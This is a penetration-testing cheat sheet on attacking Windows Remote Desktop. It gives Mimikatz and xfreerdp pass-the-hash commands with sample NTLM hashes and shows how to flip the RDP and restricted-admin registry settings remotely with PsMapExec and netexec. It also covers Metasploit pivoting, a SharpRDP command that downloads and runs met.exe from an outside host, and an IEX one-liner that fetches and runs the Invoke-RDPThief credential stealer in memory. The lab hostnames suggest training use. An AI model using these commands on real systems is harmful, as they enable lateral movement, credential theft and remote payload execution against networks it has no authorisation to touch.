# RDP Pass-the-Hash

## Mimikatz
```
privilege::debug

# Domain
sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[RC4] /run:"mstsc.exe /restrictedadmin"

# PTH to local admin
sekurlsa::pth /user:administrator /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /domain:web06 /run:"mstsc.exe /restrictedadmin"
```

## xfreeRDP
Potentially append ```/admin``` to the command below if required to force a user off RDP to connect.
```bash
xfreerdp /u:[User] /pth:[RC4] /v:[IP] /cert-ignore +clipboard /dynamic-resolution
```
## Enabling / Disabling RDP from remote
```powershell
# Windows
# Enable
PsMapExec -Targets appsrv01 -Method wmi -Username admin -Hash 2892D26CDF84D7A70E2EB3B9F05C425E -Command "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f"

# Disable
PsMapExec -Targets appsrv01 -Method wmi -Username admin -Hash 2892D26CDF84D7A70E2EB3B9F05C425E -Command "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 1 /f"

# Linux
# Enable
netexec smb 192.168.210.6 -u admin -H 2892D26CDF84D7A70E2EB3B9F05C425E -d corp1 -x "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f"

# Disable
netexec smb 192.168.210.6 -u admin -H 2892D26CDF84D7A70E2EB3B9F05C425E -d corp1 -x "reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 1 /f"
```

## Enabling / Disabling restricted admin from remote

```powershell
# Windows
# Enable
PsMapExec -Targets appsrv01 -Method wmi -Username admin -Hash 2892D26CDF84D7A70E2EB3B9F05C425E -Command "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# Disable
PsMapExec -Targets appsrv01 -Method wmi -Username admin -Hash 2892D26CDF84D7A70E2EB3B9F05C425E -Command "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f"

# Linux
# Enable
netexec smb 192.168.210.6 -u admin -H 2892D26CDF84D7A70E2EB3B9F05C425E -d corp1 -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"

# Disable
netexec smb 192.168.210.6 -u admin -H 2892D26CDF84D7A70E2EB3B9F05C425E -d corp1 -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f"
```
Output when attempting to connect with `mstsc.exe /restrictedadmin` when `DisableRestrictedAdmin` is set to `1` (Disabled)

![image](https://github.com/user-attachments/assets/40444178-7b89-4f15-8e57-3e34e198a6fe)

# RDP Proxying

## Metasploit
```
# Sets up a tunnel and routes traffic from the compromised host's network back to Metasploit
use multi/manage/autoroute
set session 1
exploit

# Sets up a local SOCKS4A proxy server to tunnel traffic Mthrough etasploit
use auxiliary/server/socks4a
set srvhost 127.0.0.1
exploit -j

# Configure socks proxy
set version 4a
set srvhost 127.0.0.1
run

# Configure proxychains
sudo nano /etc/proxychains4.conf 

# Change port on last line to same port used above
```
# RDP Command Execution
```powershell
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
```
# Invoke-RDPThief

```powershell
# Load into memory and execute (Run as admin)
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")
```
